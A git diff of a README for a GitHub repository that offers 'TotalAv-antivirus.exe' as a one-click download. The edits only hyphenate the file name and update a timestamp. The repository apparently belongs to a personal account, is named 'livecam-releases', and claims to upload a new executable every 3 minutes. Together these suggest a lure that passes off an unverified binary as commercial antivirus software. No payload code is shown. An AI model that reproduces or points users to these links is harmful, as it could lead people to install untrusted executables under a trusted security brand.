@@ -1,4 +1,4 @@
-# 📹 Totalav Antivirus Releases
+# 📹 Totalav-Antivirus Releases
 
 ![Status](https://img.shields.io/badge/status-active-success.svg)
 ![Last Updated](https://img.shields.io/badge/last%20updated-2025--10--31-blue.svg)
@@ -6,11 +6,11 @@
 
 ## 🎯 About
 
-This repository contains automated releases of TotalAv antivirus, updated every 3 minutes.
+This repository contains automated releases of TotalAv-antivirus, updated every 3 minutes.
 
 ## 📥 Download Latest Version
 
-**[⬇️ Click here to download the latest TotalAv antivirus.exe](https://github.com/ankitkumarsingh0031-a11y/livecam-releases/releases/latest/download/TotalAv antivirus.exe)**
+**[⬇️ Click here to download the latest TotalAv-antivirus.exe](https://github.com/ankitkumarsingh0031-a11y/livecam-releases/releases/latest/download/TotalAv-antivirus.exe)**
 
 ### Alternative: Browse All Releases
 
@@ -25,7 +25,7 @@ Visit the [Releases page](https://github.com/ankitkumarsingh0031-a11y/livecam-re
 ## 📊 Release Information
 
 Each release includes:
-- 📦 Complete TotalAv antivirus.exe file
+- 📦 Complete TotalAv-antivirus.exe file
 - 🕐 Timestamp of upload
 - 📝 Automated release notes
 - 🔗 Direct download link
@@ -34,7 +34,7 @@ Each release includes:
 
 The most recent upload can always be accessed via:
 ```
-https://github.com/ankitkumarsingh0031-a11y/livecam-releases/releases/latest/download/TotalAv antivirus.exe
+https://github.com/ankitkumarsingh0031-a11y/livecam-releases/releases/latest/download/TotalAv-antivirus.exe
 ```
 
 ## 📌 Features
@@ -52,7 +52,7 @@ https://github.com/ankitkumarsingh0031-a11y/livecam-releases/releases/latest/dow
 - **Update Interval**: 3 minutes
 - **Storage**: Latest 5 releases retained
 - **Access**: Public, no authentication required
-- **File**: TotalAv antivirus.exe
+- **File**: TotalAv-antivirus.exe
 
 ## 📝 License
 
@@ -60,4 +60,4 @@ This is an automated upload repository. All content rights reserved.
 
 ---
 
-*Last automated update: October 31, 2025 at 20:19:30*
+*Last automated update: October 31, 2025 at 20:22:30*
